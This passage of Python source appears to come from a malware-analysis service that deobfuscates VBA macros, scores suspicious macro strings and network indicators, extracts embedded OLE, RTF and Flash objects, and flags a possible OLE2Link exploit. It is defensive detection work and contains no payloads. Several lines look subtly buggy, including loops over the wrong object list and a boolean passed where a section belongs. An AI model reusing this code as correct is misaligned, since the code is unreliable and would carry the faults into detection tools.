            dump_subsection = ResultSection(SCORE.NULL, dump_title, body_format=TEXT_FORMAT.MEMORY_DUMP)
            dump_subsection.add_line(analyzed_code)

        if req_deob:
            dump_subsection.add_tag(TAG_TYPE.TECHNIQUE_OBFUSCATION,
                                    "VBA Macro String Functions",
                                    weight=TAG_WEIGHT.LOW,
                                    usage=TAG_USAGE.IDENTIFICATION)

        score_subsection = self.macro_scorer(analyzed_code)
        if score_subsection:
            macro_section.add_section(score_subsection)
            macro_section.add_section(dump_subsection)

        # Flag macros
        if self.flag_macro(analyzed_code):
            macro_section.add_section(ResultSection(SCORE.HIGH, "Macro may be packed or obfuscated."))

        return macro_section

    # TODO: deobfuscator is very primitive; visual inspection and dynamic analysis will often be most useful
    # TODO: may want to eventually pull this out into a Deobfuscation helper that supports multi-languages
    def deobfuscator(self, text):
        self.log.debug("Deobfuscation running")
        deobf = text
        # noinspection PyBroadException
        try:
            # leading & trailing quotes in each local function are to facilitate the final re.sub in deobfuscator()

            # repeated chr(x + y) calls seen in wild, as per SANS ISC diary from May 8, 2015
            def deobf_chrs_add(m):
                if m.group(0):
                    i = int(m.group(1)) + int(m.group(2))

                    if (i >= 0) and (i <= 255):
                        return "\"%s\"" % chr(i)
                return ''

            deobf = re.sub(r'chr[\$]?\((\d+) \+ (\d+)\)', deobf_chrs_add, deobf, flags=re.IGNORECASE)

            def deobf_unichrs_add(m):
                result = ''
                if m.group(0):
                    result = m.group(0)

                    i = int(m.group(1)) + int(m.group(2))

                    # unichr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        result = "\"%s\"" % unichr(i)
                return result

            deobf = re.sub(r'chrw[\$]?\((\d+) \+ (\d+)\)', deobf_unichrs_add, deobf, flags=re.IGNORECASE)

            # suspect we may see chr(x - y) samples as well
            def deobf_chrs_sub(m):
                if m.group(0):
                    i = int(m.group(1)) - int(m.group(2))

                    if (i >= 0) and (i <= 255):
                        return "\"%s\"" % chr(i)
                return ''

            deobf = re.sub(r'chr[\$]?\((\d+) \- (\d+)\)', deobf_chrs_sub, deobf, flags=re.IGNORECASE)

            def deobf_unichrs_sub(m):
                if m.group(0):
                    i = int(m.group(1)) - int(m.group(2))

                    # unichr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        return "\"%s\"" % unichr(i)
                return ''

            deobf = re.sub(r'chrw[\$]?\((\d+) \- (\d+)\)', deobf_unichrs_sub, deobf, flags=re.IGNORECASE)

            def deobf_chr(m):
                if m.group(1):
                    i = int(m.group(1))

                    if (i >= 0) and (i <= 255):
                        return "\"%s\"" % chr(i)
                return ''

            deobf = re.sub('chr[\$]?\((\d+)\)', deobf_chr, deobf, flags=re.IGNORECASE)

            def deobf_unichr(m):
                if m.group(1):
                    i = int(m.group(1))

                    # unichr range is platform dependent, either [0..0xFFFF] or [0..0x10FFFF]
                    if (i >= 0) and ((i <= 0xFFFF) or (i <= 0x10FFFF)):
                        return "\"%s\"" % unichr(i)
                return ''

            deobf = re.sub('chrw[\$]?\((\d+)\)', deobf_unichr, deobf, flags=re.IGNORECASE)

            # handle simple string concatenations
            deobf = re.sub('" & "', '', deobf)

        except:
            self.log.debug("Deobfuscator regex failure, reverting to original text")
            deobf = text

        return deobf

    #  note: we manually add up the score_section.score value here so that it is usable before the service finishes
    #        otherwise it is not calculated until finalize() is called on the top-level ResultSection
    def macro_scorer(self, text):
        self.log.debug("Macro scorer running")
        score_section = None

        try:
            vba_scanner = VBA_Scanner(text)
            vba_scanner.scan(include_decoded_strings=True)

            for string in self.ADDITIONAL_SUSPICIOUS_KEYWORDS:
                if re.search(string, text, re.IGNORECASE):
                    # play nice with detect_suspicious from olevba.py
                    vba_scanner.suspicious_keywords.append((string, 'May download files from the Internet'))

            stringcount = len(vba_scanner.autoexec_keywords) + len(vba_scanner.suspicious_keywords) + \
                len(vba_scanner.iocs)

            if stringcount > 0:
                score_section = ResultSection(SCORE.NULL, "Interesting macro strings found")

                if len(vba_scanner.autoexec_keywords) > 0:
                    subsection = ResultSection(min(self.MAX_STRING_SCORE,
                                                   SCORE.LOW * len(vba_scanner.autoexec_keywords)),
                                               "Autoexecution strings")

                    for keyword, description in vba_scanner.autoexec_keywords:
                        subsection.add_line(keyword)
                        subsection.add_tag(TAG_TYPE.OLE_MACRO_SUSPICIOUS_STRINGS,
                                           keyword, TAG_WEIGHT.HIGH,
                                           usage=TAG_USAGE.IDENTIFICATION)
                    score_section.add_section(subsection)

                if len(vba_scanner.suspicious_keywords) > 0:
                    subsection = ResultSection(min(self.MAX_STRING_SCORE,
                                                   SCORE.MED * len(vba_scanner.suspicious_keywords)),
                                               "Suspicious strings or functions")

                    for keyword, description in vba_scanner.suspicious_keywords:
                        subsection.add_line(keyword)
                        subsection.add_tag(TAG_TYPE.OLE_MACRO_SUSPICIOUS_STRINGS,
                                           keyword, TAG_WEIGHT.HIGH,
                                           usage=TAG_USAGE.IDENTIFICATION)
                    score_section.add_section(subsection)

                if len(vba_scanner.iocs) > 0:
                    subsection = ResultSection(min(500, SCORE.MED * len(vba_scanner.iocs)),
                                               "Potential host or network IOCs")

                    scored_macro_uri = False
                    for keyword, description in vba_scanner.iocs:
                        # olevba seems to have swapped the keyword for description during iocs extraction
                        # this holds true until at least version 0.27

                        desc_ip = self.ip_re.match(description)
                        puri, duri = self.parse_uri(description)
                        if puri:
                            subsection.add_line("{}: {}".format(keyword, duri))
                            scored_macro_uri = True
                        elif desc_ip:
                            ip_str = desc_ip.group(1)
                            if not is_ip_reserved(ip_str):
                                scored_macro_uri = True
                                subsection.add_tag(TAG_TYPE.NET_IP,
                                                   ip_str,
                                                   TAG_WEIGHT.HIGH,
                                                   usage=TAG_USAGE.CORRELATION)
                        else:
                            subsection.add_line("{}: {}".format(keyword, description))
                    score_section.add_section(subsection)
                    if scored_macro_uri and self.scored_macro_uri is False:
                        self.scored_macro_uri = True
                        scored_uri_section = ResultSection(score=500,
                                                           title_text="Found network indicator(s) within macros")
                        self.ole_result.add_section(scored_uri_section)

        except Exception as e:
            self.log.debug("OleVBA VBA_Scanner constructor failed: {}".format(str(e)))

        return score_section

    def rip_mhtml(self, data):
        if self.task.tag != 'document/office/mhtml':
            return

        mime_res = ResultSection(score=500,
                                 title_text="ActiveMime Document(s) in multipart/related")

        mhtml = email.message_from_string(data)
        # find all the attached files:
        for part in mhtml.walk():
            content_type = part.get_content_type()
            if content_type == "application/x-mso":
                part_data = part.get_payload(decode=True)
                if len(part_data) > 0x32 and part_data[:10].lower() == "activemime":
                    try:
                        part_data = zlib.decompress(part_data[0x32:])  # Grab  the zlib-compressed data
                        part_filename = part.get_filename(None) or hashlib.sha256(part_data).hexdigest()
                        part_path = os.path.join(self.working_directory, part_filename)
                        with open(part_path, 'w') as fh:
                            fh.write(part_data)
                        try:
                            mime_res.add_line(part_filename)
                            self.request.add_extracted(part_path, "ActiveMime x-mso from multipart/related.")
                        except Exception as e:
                            self.log.error("Error submitting extracted file: {}".format(e))
                    except Exception as e:
                        self.log.debug("Could not decompress ActiveMime part: {}".format(e))

        if len(mime_res.body) > 0:
            self.ole_result.add_section(mime_res)

    def process_ole10native(self, stream_name, data, streams_section):
        suspicious = False
        sus_sec = ResultSection(SCORE.NULL, "Suspicious streams content:")
        try:
            ole10native = Ole10Native(data)

            ole10_stream_file = os.path.join(self.working_directory,
                                             hashlib.sha256(ole10native.native_data).hexdigest())

            with open(ole10_stream_file, 'w') as fh:
                fh.write(ole10native.native_data)

            stream_desc = "{} ({}):\n\tFilename: {}\n\tData Length: {}".format(
                stream_name, ole10native.label, ole10native.filename, ole10native.native_data_size
            )
            streams_section.add_line(stream_desc)
            self.request.add_extracted(ole10_stream_file, "Embedded OLE Stream {}" .format(stream_name))

            # handle embedded native macros
            if ole10native.label.endswith(".vbs") or \
                    ole10native.command.endswith(".vbs") or \
                    ole10native.filename.endswith(".vbs"):

                self.ole_result.add_tag(TAG_TYPE.TECHNIQUE_MACROS,
                                        "Contains Embedded VBA Macro(s)",
                                        weight=TAG_WEIGHT.LOW,
                                        usage=TAG_USAGE.IDENTIFICATION)

                self.all_vba.append(ole10native.native_data)
                macro_section = self.macro_section_builder(ole10native.native_data)
                toplevel_score = self.calculate_nested_scores(macro_section)

                self.all_macros.append(Macro(ole10native.native_data,
                                             hashlib.sha256(ole10native.native_data).hexdigest(),
                                             macro_section,
                                             toplevel_score))
            else:
                # Look for suspicious strings
                for pattern, desc in self.suspicious_strings:
                    matched = re.search(pattern, ole10native.native_data)
                    if matched:
                        suspicious = True
                        if 'javascript' in desc:
                            sus_sec.score += 500
                        if 'executable' in desc:
                            sus_sec.score += 500
                        else:
                            sus_sec.score += 100
                        sus_sec.add_line("'{}' string found in stream {}, indicating {}"
                                         .format(safe_str(matched.group(0)), ole10native.filename, desc))

            if suspicious:
                streams_section.add_section(suspicious)

            return True
        except Exception as e:
            self.log.debug("Failed to parse Ole10Native stream: {}".format(e))
            return False

    def process_powerpoint_stream(self, data, streams_section):
        try:
            powerpoint = PowerPointDoc(data)
            pp_line = "PowerPoint Document"
            if len(powerpoint.objects) > 0:
                streams_section.add_line(pp_line)
            for obj in powerpoint.objects:
                if obj.rec_type == "ExOleObjStg":
                    if obj.error is not None:
                        streams_section.add_line("\tError parsing ExOleObjStg stream. This is suspicious.")
                        streams_section.score += 50
                        continue

                    ole_hash = hashlib.sha256(obj.raw).hexdigest()
                    ole_obj_filename = os.path.join(self.working_directory,
                                                    "{}.pp_ole".format(ole_hash))
                    with open(ole_obj_filename, 'w') as fh:
                        fh.write(obj.raw)

                    streams_section.add_line(
                        "\tPowerPoint Embedded OLE Storage:\n\t\tSHA-256: {}\n\t\t"
                        "Length: {}\n\t\tCompressed: {}".format(
                            ole_hash, len(obj.raw), obj.compressed)
                    )
                    self.log.debug("Added OLE stream within a PowerPoint Document Stream: {}".format(ole_obj_filename))
                    self.request.add_extracted(ole_obj_filename,
                                               "Embedded OLE Storage within PowerPoint Document Stream",
                                               "ExeOleObjStg_{}".format(ole_hash)
                                               )
            return True
        except Exception as e:
            self.log.error("Failed to parse PowerPoint Document stream: {}".format(e))
            return False

    def process_ole_stream(self, ole, streams_section):
        listdir = ole.listdir()

        decompress = False
        for dir_entry in listdir:
            if "\x05HwpSummaryInformation" in dir_entry:
                decompress = True
        decompress_macros = []

        exstr_sec = None
        if self.request.deep_scan:
            exstr_sec = ResultSection(SCORE.NULL, "Extracted Ole streams:", body_format=TEXT_FORMAT.MEMORY_DUMP)
        ole10_res = False
        ole10_sec = ResultSection(SCORE.NULL, "Extracted Ole10Native streams:", body_format=TEXT_FORMAT.MEMORY_DUMP)
        pwrpnt_res = False
        pwrpnt_sec = ResultSection(SCORE.NULL, "Extracted Powerpoint streams:", body_format=TEXT_FORMAT.MEMORY_DUMP)
        swf_res = False
        swf_sec = ResultSection(SCORE.LOW, "Flash objects detected in OLE stream:", body_format=TEXT_FORMAT.MEMORY_DUMP)
        hex_res = False
        hex_sec = ResultSection(SCORE.VHIGH, "VB hex notation:")
        sus_res = False
        sus_sec = ResultSection(SCORE.NULL, "Suspicious stream content:")

        for direntry in ole.direntries:
            extract_stream = False
            if direntry is not None and direntry.entry_type == olefile.STGTY_STREAM:
                stream = safe_str(direntry.name)
                self.log.debug("Extracting stream: {}".format(stream))
                fio = ole._open(direntry.isectStart, direntry.size)
                data = fio.getvalue()
                stm_sha = hashlib.sha256(data).hexdigest()
                try:

                    if "Ole10Native" in stream:
                        if self.process_ole10native(stream, data, ole10_sec) is True:
                            ole10_res = True
                            continue

                    elif "PowerPoint Document" in stream:
                        if self.process_powerpoint_stream(data, pwrpnt_sec) is True:
                            pwrpnt_res = True
                            continue

                    if decompress:
                        try:
                            data = zlib.decompress(data, -15)
                        except zlib.error:
                            pass

                    # Find flash objects in streams
                    if b'FWS' in data or b'CWS' in data:
                        swf_found = self.extract_swf_objects(fio)
                        if swf_found:
                            extract_stream = True
                            swf_res = True
                            swf_sec.add_line("Flash object detected in OLE stream {}" .format(stream))

                    # Find hex encoded chunks
                    for vbshex in re.findall(self.re_vbs_hex, data):
                        decoded = self.extract_vb_hex(vbshex)
                        if decoded:
                            extract_stream = True
                            hex_res = True
                            hex_sec.add_line("Found large chunk of VBA hex notation in stream {}".format(stream))

                    # Find suspicious strings
                    # Look for suspicious strings
                    for pattern, desc in self.suspicious_strings:
                        matched =  re.search(pattern, data)
                        if matched:
                            if "_VBA_PROJECT" not in stream:
                                extract_stream = True
                                sus_res = True
                                if 'javascript' in desc:
                                    sus_sec.score += 500
                                if 'executable' in desc:
                                    sus_sec.score += 500
                                else:
                                    sus_sec.score += 100
                                sus_sec.add_line("'{}' string found in stream {}, indicating {}"
                                                 .format(safe_str(matched.group(0)), stream, desc))

                    # All streams are extracted with deep scan (see below)
                    if extract_stream and not self.request.deep_scan:
                        stream_name = '{}.ole_stream'.format(stm_sha)
                        stream_path = os.path.join(self.working_directory, stream_name)
                        with open(stream_path, 'w') as fh:
                            fh.write(data)
                        self.request.add_extracted(stream_path, "Embedded OLE Stream {}." .format(stream))
                        if decompress and (stream.endswith(".ps") or stream.startswith("Scripts/")):
                            decompress_macros.append(data)

                    # Only write all streams with deep scan.
                    if self.request.deep_scan:
                        exstr_sec.add_line("Stream Name:{}, SHA256: {}" .format(stream, stm_sha))
                        stream_name = '{}.ole_stream'.format(stm_sha)
                        stream_path = os.path.join(self.working_directory, stream_name)
                        with open(stream_path, 'w') as fh:
                            fh.write(data)
                        self.request.add_extracted(stream_path, "Embedded OLE Stream {}." .format(stream))
                        if decompress and (stream.endswith(".ps") or stream.startswith("Scripts/")):
                            decompress_macros.append(data)

                except Exception as e:
                    self.log.error("Error adding extracted stream {}:\t{}".format(stream, e))
                    continue

        if exstr_sec:
            streams_section.add_section(exstr_sec)
        if ole10_res:
            streams_section.add_section(ole10_sec)
        if pwrpnt_res:
            streams_section.add_section(pwrpnt_sec)
        if swf_res:
            streams_section.add_section(swf_sec)
        if hex_res:
            streams_section.add_section(hex_sec)
        if sus_res:
            streams_section.add_section(sus_sec)

        if decompress_macros:
            # HWP Files
            dmac_sec = ResultSection(SCORE.HIGH, "Compressed macros found, see extracted files")
            streams_section.add_section(dmac_sec)
            macros = "\n".join(decompress_macros)
            stream_name = '{}.macros'.format(hashlib.sha256(macros).hexdigest())
            stream_path = os.path.join(self.working_directory, stream_name)
            with open(stream_path, 'w') as fh:
                fh.write(macros)
            self.request.add_extracted(stream_path, "Combined macros.", "all_macros.ps")

    # noinspection PyBroadException
    def extract_streams(self, file_name, file_contents):
        oles = {}
        try:
            streams_res = ResultSection(score=SCORE.NULL,
                                        title_text="Embedded document stream(s)")
            is_zip = False
            is_ole = False
            # Get the OLEs from PK package
            if zipfile.is_zipfile(file_name):
                is_zip = True
                z = zipfile.ZipFile(file_name)
                for f in z.namelist():
                    if f in oles:
                        continue
                    bin_data = z.open(f).read()
                    bin_fname = os.path.join(self.working_directory,
                                             "{}.tmp".format(hashlib.sha256(bin_data).hexdigest()))
                    with open(bin_fname, 'w') as bin_fh:
                        bin_fh.write(bin_data)
                    if olefile.isOleFile(bin_fname):
                        oles[f] = olefile.OleFileIO(bin_fname)
                z.close()

            if olefile.isOleFile(file_name):
                is_ole = True
                oles[file_name] = olefile.OleFileIO(file_name)

            if is_zip and is_ole:
                self.heurs.add(Oletools.AL_Oletools_002)

            for ole_filename in oles.iterkeys():
                try:
                    self.process_ole_stream(oles[ole_filename], streams_res)
                except Exception as e:
                    self.log.error("Error extracting streams: {}".format(traceback.format_exc(limit=2)))

            # RTF Package
            rtfp = rtfparse.RtfObjParser(file_contents)
            rtfp.parse()
            embedded = []
            linked = []
            unknown= []
            # RTF objdata
            for rtfobj in rtfp.objects:
                res_txt = ""
                res_alert = ""
                if rtfobj.is_ole:
                    res_txt += 'format_id: %d ' % rtfobj.format_id
                    res_txt += 'class name: %r\n' % rtfobj.class_name
                    # if the object is linked and not embedded, data_size=None:
                    if rtfobj.oledata_size is None:
                        res_txt += 'data size: N/A\n'
                    else:
                        res_txt += 'data size: %d\n' % rtfobj.oledata_size
                    if rtfobj.is_package:
                        res_txt = 'Filename: %r\n' % rtfobj.filename
                        res_txt += 'Source path: %r\n' % rtfobj.src_path
                        res_txt += 'Temp path = %r\n' % rtfobj.temp_path

                        # check if the file extension is executable:
                        _, ext = os.path.splitext(rtfobj.filename)

                        if self.re_executable_extensions.match(ext):
                            res_alert += 'EXECUTABLE FILE'

                    else:
                        res_txt += 'Not an OLE Package'
                    # Detect OLE2Link exploit
                    # http://www.kb.cert.org/vuls/id/921560
                    if rtfobj.class_name == 'OLE2Link':
                        res_alert += 'Possibly an exploit for the OLE2Link vulnerability (VU#921560, CVE-2017-0199)'
                else:
                    res_txt = 'Not a well-formed OLE object'

                if rtfobj.format_id == oleobj.OleObject.TYPE_EMBEDDED:
                    embedded.append((res_txt, res_alert))
                elif rtfobj.format_id == oleobj.OleObject.TYPE_LINKED:
                    linked.append((res_txt, res_alert))
                else:
                    unknown.append((res_txt, res_alert))

            if len(embedded) > 0:
                emb_sec = ResultSection(SCORE.LOW, "Embedded Object Details", body_format=TEXT_FORMAT.MEMORY_DUMP)
                for txt, alert in embedded:
                    emb_sec.add_line(txt)
                    if alert != "":
                        emb_sec.score = 1000
                        emb_sec.add_line("Malicious Properties found: {}" .format(alert))
                streams_res.add_section(emb_sec)
            if len(linked) > 0:
                lik_sec = ResultSection(SCORE.LOW, "Linked Object Details", body_format=TEXT_FORMAT.MEMORY_DUMP)
                for txt, alert in embedded:
                    lik_sec.add_line(txt)
                    if alert != "":
                        lik_sec.score = 1000
                        lik_sec.add_line("Malicious Properties found: {}" .format(alert))
                streams_res.add_section(lik_sec)
            if len(unknown) > 0:
                unk_sec = ResultSection(SCORE.LOW, "Unknown Object Details", body_format=TEXT_FORMAT.MEMORY_DUMP)
                for txt, alert in embedded:
                    unk_sec.add_line(txt)
                    if alert != "":
                        unk_sec.score = 1000
                        unk_sec.add_line("Malicious Properties found: {}" .format(alert))
                streams_res.add_section(unk_sec)

            objects = rtfp.objects

            # Objdata in RTF documents
            for rtfobj in objects:
                i = objects.index(rtfobj)
                if rtfobj.is_package:
                    if rtfobj.filename:
                        fname = '%s' % (self.sanitize_filename(rtfobj.filename))
                    else:
                        fname = 'object_%08X.noname' % (rtfobj.start)
                    extracted_obj = os.path.join(self.working_directory, fname)
                    with open(extracted_obj, 'wb') as fh:
                        fh.write(rtfobj.olepkgdata)
                    self.request.add_extracted(extracted_obj, 'OLE Package in object #%d:' % i)

                # When format_id=TYPE_LINKED, oledata_size=None
                elif rtfobj.is_ole and rtfobj.oledata_size is not None:
                    # set a file extension according to the class name:
                    class_name = rtfobj.class_name.lower()
                    if class_name.startswith(b'word'):
                        ext = 'doc'
                    elif class_name.startswith(b'package'):
                        ext = 'package'
                    else:
                        ext = 'bin'
                    fname = 'object_%08X.%s' % (rtfobj.start, ext)
                    extracted_obj = os.path.join(self.working_directory, fname)
                    with open(extracted_obj, 'wb') as fh:
                        fh.write(rtfobj.oledata)
                    self.request.add_extracted(extracted_obj, 'Embedded in OLE object #%d:' % i)

                else:
                    fname = 'object_%08X.raw' % (rtfobj.start)
                    extracted_obj = os.path.join(self.working_directory, fname)
                    with open(extracted_obj, 'wb') as fh:
                        fh.write(rtfobj.rawdata)
                    self.request.add_extracted(extracted_obj, 'Raw data in object #%d:' % i)

            if len(streams_res.body) > 0 or len(streams_res.subsections) > 0:
                self.ole_result.add_section(streams_res)

        except Exception as e:
            self.log.debug("Error extracting streams: {}".format(traceback.format_exc(limit=2)))

        finally:
            for fd in oles.itervalues():
                try:
                    fd.close()
                except:
                    pass
